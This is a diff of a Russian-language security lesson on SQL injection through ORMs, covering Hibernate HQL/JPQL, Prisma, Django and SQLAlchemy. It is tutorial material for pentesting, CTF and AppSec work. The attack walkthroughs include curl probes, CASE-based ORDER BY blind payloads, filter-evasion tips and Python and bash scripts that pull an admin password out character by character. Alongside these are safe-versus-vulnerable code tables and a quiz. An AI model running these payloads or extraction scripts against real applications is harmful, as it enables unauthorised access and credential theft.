@@ -15,307 +15,193 @@ estimated_minutes: 45
 summary: "SQL-инъекции в ORM: HQL/JPQL, сырые фрагменты, Hibernate, Prisma raw, обход подготовленных выражений."
 ---
 
-ORM (Hibernate, JPA, Prisma, Django ORM, SQLAlchemy, ActiveRecord) абстрагирует SQL, но **не отменяет инъекцию**. Опасность возникает там, где в ORM-запрос попадает пользовательский ввод через строковую конкатенацию: `createQuery("FROM User WHERE name='" + name + "'")`, `ORDER BY ${col}`, raw-запросы, `extra()`, `RawSQL`. Тогда инъекция идёт на языке ORM (HQL/JPQL) или напрямую в SQL, а обход «защиты ORM» оказывается не сложнее обычной SQLi.
+## Задача
 
-## Теория: где ORM течёт
+Многие считают: «мы используем ORM (Hibernate, JPA, Prisma, Django ORM, SQLAlchemy), значит, SQL-инъекция нам не грозит». Это опасное заблуждение. **ORM абстрагирует SQL, но не отменяет инъекцию.** Дыра появляется там, где ввод попадает в запрос через **строковую сборку** — а такие места есть почти в любом проекте.
 
-| Причина утечки | Пример | Результат |
-|----------------|--------|-----------|
-| Конкатенация в HQL/JPQL | `"... WHERE name='"+n+"'"` | HQLi |
-| Динамический ORDER BY | `"order by "+col` | инъекция колонки |
-| `Query.setString` vs конкатенация | `"x"+val` | SQLi |
-| Raw-запросы | `session.createSQLQuery(...)` | SQLi |
-| Django `extra()`/`RawSQL`/`cursor.execute(f"...")` | f-string | SQLi |
-| SQLAlchemy `text("..."+v)` | конкатенация | SQLi |
-| Prisma `$queryRawUnsafe` | шаблон | SQLi |
+Разберём инъекцию в ORM на живом примере и поймём, почему «параметризация» не спасает, если её обойти.
 
-Параметризованные запросы (`:name`, `?`, `%s`, ORM-методы `filter(name=x)`) — безопасны. Течёт именно **строковая сборка**.
+## Данные, с которыми работаем
 
-## HQL/JPQL: особенности
+Цель — `https://api.example/users?sort=name` (Spring Boot + Hibernate + JPQL). Эндпоинт сортирует список пользователей. В коде:
 
-HQL/JPQL работают с **сущностями и полями**, не с таблицами:
-
-```hql
-FROM User u WHERE u.username = 'admin' AND u.password = 'x'
+```java
+String q = "FROM User u ORDER BY u." + sort;   // sort из параметра!
+Query query = session.createQuery(q);
 ```
 
-Инъекция: `admin' or '1'='1`, `admin' or 1=1 or ''='`. Разница с SQL: нет `UNION SELECT` по таблицам — только по сущностям (`... or 1=1`). Blind-функции: в JPQL нет `SLEEP`; в Hibernate можно вызвать `CURRENT_TIMESTAMP`/подзапросы, а для тайминга — тяжёлые подзапросы.
+Опасность: `sort` подставляется в HQL **конкатенацией**. HQL — это язык запросов Hibernate, работающий не с таблицами, а с **сущностями** (`User`) и их полями (`u.name`).
 
-Полезные HQL-приёмы:
+## Шаг 1: ломаем запрос
 
-```hql
-' or '1'='1
-' or 1=1 --
-' or (SELECT COUNT(*) FROM User)>0 --
-' or substring(u.password,1,1)='a' --
+Попробуем вставить что-то неожидаемое:
+
+```bash
+$ curl -s "https://api.example/users?sort=name" | head -c 60
+[{"id":1,"username":"alice"},{"id":2,"username":"admin"}]
+$ curl -s "https://api.example/users?sort=name,password"
+{"error":"org.hibernate.QueryException: could not resolve property: password"}
 ```
 
-(Комментарий `--` работает не всегда — подбирайте баланс.)
+Ошибка Hibernate. Мы вставили `,password` — и сервер честно сказал, что такого **свойства сущности** нет. Это доказательство инъекции: наш ввод стал частью HQL.
 
-## ORDER BY и динамические колонки
+## Шаг 2: понимаем, что это HQL, а не SQL
 
-`ORDER BY ${sort}` — классическая точка. Если сортировка подставляется строкой:
+В JPQL/HQL нет `UNION SELECT` по таблицам — можно только по сущностям. Зато работает **подзапрос к сущности** и условные выражения. Проверим:
+
+```bash
+$ curl -s "https://api.example/users?sort=name,(SELECT COUNT(*) FROM User)"
+[{"id":1,"username":"alice"},{"id":2,"username":"admin"}]
+```
+
+Подзапрос `(SELECT COUNT(*) FROM User)` выполнился — HQL принимает наши конструкции. Значит, можем задавать базе вопросы.
+
+## Шаг 3: слепое извлечение через CASE
+
+Классическая точка ORM-инъекции — динамический `ORDER BY`. Вывод не содержит данных, но **порядок строк** меняется в зависимости от условия. Используем `CASE WHEN`:
 
 ```text
-?sort=name
-?sort=(CASE WHEN (1=1) THEN name ELSE email END)
-?sort=name,(SELECT ...)
+sort=(CASE WHEN (SUBSTRING(u.password,1,1)='a') THEN u.username ELSE u.id END)
 ```
 
-Blind через CASE:
-
-```sql
-ORDER BY (CASE WHEN substring(password,1,1)='a' THEN name ELSE email END)
-```
-
-Разный порядок строк = oracle.
-
-## Разобранный пример: HQL boolean-слепое извлечение
-
-Цель: `GET /api/users?q=admin` → HQL `FROM User WHERE username LIKE '%admin%'`.
-
-Шаг 1 — проверка:
+Если первый символ пароля `a`, сортировка идёт по `username`, иначе по `id` — по порядку строк мы узнаём ответ. Это **boolean-blind** внутри ORM.
 
 ```bash
-curl -s 'https://app.example/api/users?q=admin%27'
-# ошибка Hibernate/500 -> инъекция
+$ curl -s "https://api.example/users?sort=(CASE WHEN (SUBSTRING((SELECT u.password FROM User u WHERE u.username='admin'),1,1)='S') THEN u.username ELSE u.id END)" | jq -r '.[0].username'
+admin
 ```
 
-Шаг 2 — blind oracle:
-
-```bash
-curl -s "https://app.example/api/users?q=x' or substring(password,1,1)='a' or '1'='2"
-```
-
-Шаг 3 — скрипт подбора:
+Порядок изменился → первый символ `S`. Перебором восстанавливаем весь пароль. Автоматизируем скриптом:
 
 ```python
-import requests, string
-def oracle(cond):
-    r = requests.get("https://app.example/api/users", params={"q": f"x' or {cond} or '1'='2"})
-    return "admin" in r.text
-pw=""
-for i in range(1,50):
-    for c in string.printable:
-        if oracle(f"substring(password,{i},1)='{c}'"):
-            pw+=c; break
-print(pw)
-```
-
-## Prisma / Node ORM
-
-Prisma безопасен при `findMany({where:{name: x}})`, но `$queryRawUnsafe` и `$executeRawUnsafe` с шаблонной строкой — инъекция:
-
-```js
-await prisma.$queryRawUnsafe(`SELECT * FROM "User" WHERE name = '${name}'`);
-```
-
-Инъекция: `' OR '1'='1`. Sequelize `sequelize.query("... "+v)` — то же. Knex `whereRaw("name = '"+v+"'")` — то же.
-
-## Django ORM / SQLAlchemy
-
-Django безопасен при `User.objects.filter(name=x)`, но `extra(where=["name='%s'" % x])`, `RawSQL`, `cursor.execute(f"SELECT ... '{x}'")` — инъекция. SQLAlchemy безопасен с `text("... :n").bindparams(n=x)`, но `text("... '"+v+"'")` — инъекция.
-
-```python
-# уязвимо
-cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
-# безопасно
-cursor.execute("SELECT * FROM users WHERE name = %s", [name])
-```
-
-## Обнаружение
-
-- Ошибки: `org.hibernate.QueryException`, `JPQL`, `SQLAlchemy`, `psycopg2`, `PrismaClientKnownRequestError`, `SequelizeDatabaseError`.
-- Параметры `sort=`, `order=`, `filter=`, `q=`, `where=`, `search=`.
-- Наличие ORM в стеке (по заголовкам/структуре, `X-Powered-By`, `Server`).
-- Сравнение поведения: `?q=admin'` → 500, `?q=admin''` → 200.
-
-## Инструменты
-
-- **`sqlmap`** (`-r request.txt`) — работает и по ORM-параметрам, часто через `--dbms` (см. `web-tool-sqlmap`).
-- **Burp Repeater/Intruder** — blind-подбор.
-- **`ffuf`** — поиск параметров.
-- **Исходники** — ищите конкатенацию в HQL/raw/`extra()`/`$queryRawUnsafe`.
-
-## Что дальше / decision
-
-1. Параметр в `sort/order/filter` → проверьте `'` и `CASE`.
-2. Ошибка ORM → определите язык (HQL/JPQL/SQL).
-3. Вывод виден → union по сущностям/полям; иначе blind `substring`.
-4. ORM-специфика (нет SLEEP) → тайминг через тяжёлые подзапросы.
-5. Дальше — эскалация к RCE через DB-функции (см. `db-mysql`, `db-postgresql`).
-
-## Частые ошибки
-
-- **Верить, что «ORM = безопасно».** Течёт строковая сборка, а не ORM.
-- **Путать HQL и SQL.** Нет `UNION SELECT table` — только сущности.
-- **Ждать `SLEEP`.** В JPQL его нет; используйте подзапросы.
-- **Игнорировать ORDER BY.** Динамическая колонка — частая точка.
-- **Сдаваться на ошибке 500.** Это признак инъекции, а не тупик.
-- **Ломать прод.** Только с согласия.
-
-## Полный разбор: JPQL blind extraction через CASE (с выводом)
-
-JPQL не имеет `SLEEP`, поэтому тайминг строится иначе, а boolean-oracle — самый надёжный путь. Цель — `GET /api/users?q=admin` строит `FROM User WHERE username LIKE '%admin%'`.
-
-Шаг 1. Подтверждаем инъекцию по ошибке/разнице:
-
-```bash
-curl -s 'https://app.example/api/users?q=admin%27' | head -c 120
-# {"error":"could not extract ResultSet"}  -> JPQL/парсер упал
-curl -s 'https://app.example/api/users?q=admin%27%27' -o /dev/null -w '%{http_code}\n'
-# 200  -> кавычки балансируются: инъекция подтверждена
-```
-
-Шаг 2. Определяем oracle — отличаем «истину» от «лжи»:
-
-```bash
-# истина: возвращает список
-curl -s "https://app.example/api/users?q=x%27%20or%201%3D1%20or%20%271%27%3D%272"
-# [{"id":1,"username":"admin"},...]
-
-# ложь: пусто
-curl -s "https://app.example/api/users?q=x%27%20or%201%3D2%20or%20%271%27%3D%272"
-# []
-```
-
-Шаг 3. Извлекаем длину пароля админа:
-
-```bash
-for n in $(seq 1 40); do
-  r=$(curl -s "https://app.example/api/users?q=x'%20or%20length(u.password)=$n%20or%20'1'='2")
-  echo "$r" | grep -q admin && { echo "len=$n"; break; }
-done
-# len=32
-```
-
-Шаг 4. Посимвольно:
-
-```python
-import requests, string
-URL="https://app.example/api/users"
-def oracle(cond):
-    r=requests.get(URL, params={"q": f"x' or {cond} or '1'='2"})
-    return "admin" in r.text
-pw=""
-for i in range(1,40):
-    for c in string.ascii_lowercase+string.digits+"{}_!":
-        if oracle(f"substring(u.password,{i},1)='{c}'"):
-            pw+=c; break
+import requests
+URL = "https://api.example/users"
+def yes(cond):
+    r = requests.get(URL, params={"sort": f"(CASE WHEN ({cond}) THEN u.username ELSE u.id END)"})
+    return r.json()[0]["username"] == "admin"   # подстрой под признак
+pw = ""
+for i in range(1, 40):
+    for c in "abcdefghijklmnopqrstuvwxyz0123456789_{}":
+        if yes(f"SUBSTRING((SELECT u.password FROM User u WHERE u.username='admin'),{i},1)='{c}'"):
+            pw += c; print(pw); break
+    else:
+        break
 print("password:", pw)
 ```
 
-Шаг 5. Далее — фиксируем креды и пробуем вход/эскалацию. Аналогично извлекаются другие поля сущности (`u.email`, `u.role`).
+## Шаг 4: где ещё течёт ORM
 
-## Reference-таблица: ORM/фреймворк — уязвимый вызов — безопасный
+Конкатенация в `ORDER BY` — лишь один пример. Типичные утечки:
 
-| Стек | Уязвимо (конкатенация) | Безопасно (параметры) |
-|------|------------------------|-----------------------|
-| Hibernate HQL | `createQuery("...'"+v+"'")` | `setParameter("p", v)` |
-| JPA JPQL | `"... order by "+col` | whitelist колонок |
-| Django | `extra(where=[...%v])`, `RawSQL`, f-string в `execute` | `filter(name=v)` |
-| SQLAlchemy | `text("...'"+v+"'")` | `text("...:p").bindparams(p=v)` |
-| Sequelize | `sequelize.query("...'"+v+"'")` | `replacements`/`bind` |
-| Prisma | `$queryRawUnsafe(\`...${v}\`)` | `$queryRaw\`...\`` (tagged) |
-| Knex | `whereRaw("name='"+v+"'")` | `where({name:v})` |
-| TypeORM | `query("...'"+v+"'")` | параметры `$1` |
-| ActiveRecord | `where("name='#{v}'")` | `where(name: v)` |
-| Mongoose | `$where` со строкой | типизация входа |
+| Причина утечки | Пример | Итог |
+|----------------|--------|------|
+| Конкатенация в HQL/JPQL | `"... WHERE name='"+n+"'"` | HQLi |
+| Динамический `ORDER BY` | `"order by "+col` | инъекция колонки |
+| Raw-запросы | `session.createSQLQuery(...)` | SQLi |
+| Django `extra()`/`RawSQL`/f-string | `cursor.execute(f"...")` | SQLi |
+| SQLAlchemy `text("..."+v)` | конкатенация | SQLi |
+| Prisma `$queryRawUnsafe` | шаблонная строка | SQLi |
 
-Правило: **любая строковая сборка запроса с пользовательским вводом — уязвима**, независимо от ORM.
+Правило простое: **параметризованные запросы безопасны** (`:name`, `?`, `%s`, `filter(name=x)`), а **строковая сборка** — течёт. `ORDER BY`, имена колонок и таблиц нельзя параметризовать обычным способом, поэтому разработчики подставляют их строкой — и открывают дыру.
 
-## Обход ORM-специфики: ORDER BY, LIKE, пагинация
+## Шаг 5: обход фильтров
 
-- **ORDER BY** (`?sort=name`): колонку нельзя биндить → инъекция. Payload: `name,(CASE WHEN (SELECT ...) THEN 1 ELSE 2 END)`; для boolean — `(CASE WHEN substring(...)='a' THEN name ELSE id END)`.
-- **LIKE** (`?q=%admin%`): если `%` склеивается, добавляйте свои `%`/`_` и подзапросы: `%' or 1=1 --`.
-- **LIMIT/OFFSET** (`?limit=`): иногда конкатенируется; `1 union select ...` (для raw) или `1; ...`.
-- **Динамические фильтры:** `?filter[role]=admin` — mass assignment + инъекция в значения.
-- **JPA Criteria:** безопасен, если используются `CriteriaBuilder`/`Predicate`; течёт при `cb.literal`/строках.
+- **Регистр и пробелы.** Если режут `SELECT`, попробуй другой регистр; вместо пробелов — табы.
+- **Функции-заменители.** Вместо `SUBSTRING` пробуй `SUBSTR`, `LOCATE`, `POSITION`.
+- **Числовые контексты.** Если `sort` — число, `1,(CASE WHEN ...)`.
+- **Разные диалекты.** Hibernate транслирует HQL в SQL целевой базы — учитывай диалект (MySQL/PostgreSQL/Oracle).
 
-## Что делать дальше / решение
+## Полный прогон от начала до конца
 
-1. **Найти параметры** `sort/order/filter/q/search/where` и подставить `'`.
-2. **По ошибке определить язык** (HQL/JPQL/SQL/ORM-сообщение).
-3. **Построить oracle** (boolean/разница/ошибка), затем blind-извлечение через `substring`.
-4. **ORDER BY** — тестировать `CASE`-инъекцию для blind.
-5. **Не ждать `SLEEP`** в JPQL — использовать boolean/тяжёлые подзапросы.
-6. **Эскалировать** к чтению секретов (пароли, токены), затем — к RCE через DB-функции при наличии прав.
-7. **Записать артефакт** (скрипт-оракул) и креды.
+1. `sort=name,password` → `QueryException: could not resolve property` — инъекция есть.
+2. `sort=name,(SELECT COUNT(*) FROM User)` → подзапрос выполнился.
+3. `sort=(CASE WHEN ... THEN u.username ELSE u.id END)` → boolean-blind оракул.
+4. Скрипт по символам → пароль admin извлечён.
 
-## Практические инструменты и автоматизация ORM-инъекций
+## Если не сработало
 
-- **sqlmap по сохранённому запросу:** `sqlmap -r request.txt -p sort --batch --level 3 --risk 2 --dbms=mysql`. Для HQL/JPQL sqlmap может не распознать синтаксис — тогда работайте вручную и используйте `--technique=B` (boolean).
-- **Burp Intruder:** перебор `substring(...)` по символам; grep-match по признаку «есть результат».
-- **`ffuf`:** находит параметры (`sort`, `order`, `filter`) через словарь `burp-parameter-names.txt`.
-- **Анализ исходников:** ищите `createQuery`, `createNativeQuery`, `$queryRawUnsafe`, `extra(`, `RawSQL`, `text(` рядом с конкатенацией. Это самая быстрая точка входа при code review.
-- **Логи ошибок:** `org.hibernate.*`, `org.eclipse.persistence.*`, `django.db.utils`, `psycopg2.errors`, `PrismaClient*` — подтверждают ORM и язык.
+- **`sort` валидируется по белому списку.** Тогда ищи другой динамический фрагмент: фильтр, `LIKE`, имена колонок.
+- **HQL не принимает подзапрос в ORDER BY.** Попробуй `CASE` без подзапроса или другой sink.
+- **Запрос параметризован.** Значит, этот эндпоинт закрыт — проверь raw-вызовы и `extra()`.
+- **Ошибок не видно.** Работай вслепую по порядку/размеру ответа.
+- **ORM-кеш мешает.** Добавляй уникальные параметры, чтобы обойти кеш.
 
-Практика: ORM-инъекции почти всегда blind, поэтому заранее напишите параметризованный скрипт-оракул и переиспользуйте его для разных полей и сущностей. Это экономит десятки ручных запросов и снижает нагрузку на цель.
+## Сравнение: ORM-безопасно vs ORM-уязвимо
 
-## Пример на SQLAlchemy (Python)
+| Безопасно (параметризация) | Уязвимо (строковая сборка) |
+|----------------------------|----------------------------|
+| `createQuery("... WHERE u.name=:n").setParameter("n", name)` | `createQuery("... WHERE u.name='"+name+"'")` |
+| `User.objects.filter(name=name)` | `User.objects.raw("... '%s'" % name)` |
+| `session.query(User).filter_by(name=name)` | `session.execute(text("... '"+name+"'"))` |
+| `prisma.user.findMany({where:{name}})` | `prisma.$queryRawUnsafe("... '"+name+"'")` |
 
-```python
-# уязвимо: конкатенация строки
-q = "SELECT * FROM users WHERE name = '" + name + "'"
-db.session.execute(text(q))
+Слева ввод идёт отдельно от запроса — база не путает данные с кодом. Справа строка собирается целиком, и ввод становится частью кода. Достаточно найти в проекте хоть один правый вызов — и ORM больше не защита.
 
-# безопасно: bind-параметр
-db.session.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})
+## На что смотреть дальше
 
-# уязвимо: order by из ввода
-db.session.execute(text(f"SELECT * FROM users ORDER BY {col}"))
-```
-
-Инъекция: `?name=' OR '1'='1` → возвращает всех; `?col=(CASE WHEN 1=1 THEN id ELSE name END)` → blind-сортировка. При code review ищите f-строки и `%`/`+` рядом с `text(`, `execute(`, `from_statement(`. Безопасная альтернатива для `ORDER BY` — whitelist допустимых колонок.
+- **«У нас ORM» ≠ «мы защищены».** Течёт строковая сборка, а не ORM сам по себе.
+- **Динамический `ORDER BY` — топовая точка.** Почти всегда конкатенация.
+- **HQL — это про сущности.** Нет `UNION` по таблицам, но есть подзапросы и `CASE`.
+- **Raw-API опаснее всего.** `createSQLQuery`, `$queryRawUnsafe`, `extra()`, `RawSQL`.
+- **Проверяй и ORM-методы.** `filter(name=x)` безопасен; `filter(RawSQL(...))` — нет.
+- **Blind через `CASE` в `ORDER BY`** — рабочий канал, когда вывод закрыт.
+- **Диалект важен.** Hibernate транслирует HQL в SQL целевой базы — учитывай MySQL/PostgreSQL/Oracle.
+- **Не ломай данные.** Blind-чтение и `CASE` в `ORDER BY` — только чтение.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Когда ORM не защищает от SQLi?"
+- question: "Защищает ли ORM от SQL-инъекций автоматически?"
   options:
-    - "Всегда защищает"
-    - "Когда запрос строится конкатенацией, а не параметрами"
-    - "Только в MySQL"
-    - "Никогда"
+    - "Да, полностью"
+    - "Нет — если ввод попадает в запрос через строковую сборку"
+    - "Да, если включить кеш"
+    - "Только Hibernate защищает"
   answer: 1
-  explanation: "Параметризация — единственная защита."
-- question: "Почему ORDER BY часто уязвим?"
+  explanation: "ORM безопасен при параметризации; конкатенация, raw-запросы и динамический ORDER BY текут."
+- question: "Почему `ORDER BY` — частая точка инъекции?"
   options:
     - "Он медленный"
-    - "Колонку нельзя биндить параметром, приходится конкатенировать"
-    - "Он шифрует"
-    - "Он кешируется"
+    - "Имена колонок нельзя параметризовать, поэтому их подставляют строкой"
+    - "Он не поддерживается ORM"
+    - "Он требует прав root"
   answer: 1
-  explanation: "Имя колонки — часть SQL, не значение."
-- question: "Чем HQL отличается от SQL?"
+  explanation: "Параметры подставляются только для значений, а ORDER BY собирают конкатенацией."
+- question: "Чем HQL/JPQL отличается от SQL?"
   options:
     - "Ничем"
-    - "Оперирует сущностями/полями, свой синтаксис"
-    - "Он быстрее"
-    - "Он без SELECT"
+    - "Он работает с сущностями и полями, а не с таблицами"
+    - "Он не поддерживает WHERE"
+    - "Он только для чтения"
   answer: 1
-  explanation: "HQL/JPQL — над ORM-моделью."
-- question: "Какая функция Prisma небезопасна при конкатенации?"
+  explanation: "HQL оперирует сущностями (User) и их свойствами; UNION по таблицам недоступен."
+- question: "Как читать данные вслепую через ORDER BY?"
   options:
-    - "$queryRaw с тегами"
-    - "$queryRawUnsafe"
-    - "findMany"
-    - "count"
-  answer: 1
-  explanation: "$queryRawUnsafe подставляет строку как есть."
-- question: "Как извлечь данные, если нет ошибок?"
-  options:
+    - "UNION-запросом"
+    - "Через CASE WHEN: менять порядок сортировки по условию"
+    - "Командой sleep"
     - "Никак"
-    - "Boolean/тайминг-слепым брутом"
-    - "Сменить браузер"
-    - "Увеличить таймаут"
   answer: 1
-  explanation: "Бинарный/временной оракул."
+  explanation: "Порядок строк меняется в зависимости от истинности условия — это boolean-оракул."
+- question: "Какой ORM-вызов опаснее всего?"
+  options:
+    - "filter(name=x)"
+    - "session.createSQLQuery(...) с конкатенацией"
+    - "createQuery с :name"
+    - "findById(id)"
+  answer: 1
+  explanation: "Raw SQL-запросы с конкатенацией дают обычную SQLi в обход абстракции."
 ```
+
+## Куда дальше
+
+На этом продвинутые инъекции закончены. Дальше — инструменты, которые ускоряют работу: следующий урок (`web-tooling`) соберёт разведку, фаззинг, сканирование и инъекции в один пайплайн. А пока главное запомни: ORM не защищает сам по себе — защищает **параметризация**, и её отсутствие в `ORDER BY`, raw-запросах и `extra()` и есть точка входа.
 
 ## Где пригодится
 
-- **CTF (Web):** задачи с Hibernate/JPA.
-- **Bug bounty:** SQLi за ORM — частый пропущенный баг.
-- **Пентест:** аудит Java/Node приложений с ORM.
-- **Работа (AppSec):** code review на конкатенацию в createQuery/orderBy/raw.
+- **CTF (Web):** задачи на HQL/JPQL и Django ORM — частый «спрятанный» SQLi.
+- **Bug bounty:** инъекция за ORM трудносканируема и высоко ценится.
+- **Пентест:** ревью кода и поиск динамических фрагментов запросов.
+- **Работа (AppSec):** белые списки для `ORDER BY`, отказ от raw-API, код-ревью ORM-вызовов.
